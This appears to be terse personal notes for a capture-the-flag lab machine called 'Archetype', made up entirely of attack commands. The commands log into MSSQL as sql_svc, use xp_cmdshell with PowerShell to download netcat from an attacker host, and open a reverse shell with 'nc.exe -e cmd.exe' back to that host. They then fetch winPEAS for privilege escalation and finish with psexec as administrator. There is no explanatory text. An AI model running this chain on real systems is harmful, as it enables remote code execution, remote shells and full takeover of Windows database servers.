``` bash
python3 mssqlclient.py ARCHETYPE/sql_svc@<IP> -windows-auth
``` 

python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth 

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.17.182/nc.exe -outfile nc.exe"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.17.182 443"

powershell 
wget http://10.10.17.182/winPEASx64.exe -outfile winPEASx64.exe


python3 psexec.py administrator@10.129.95.187
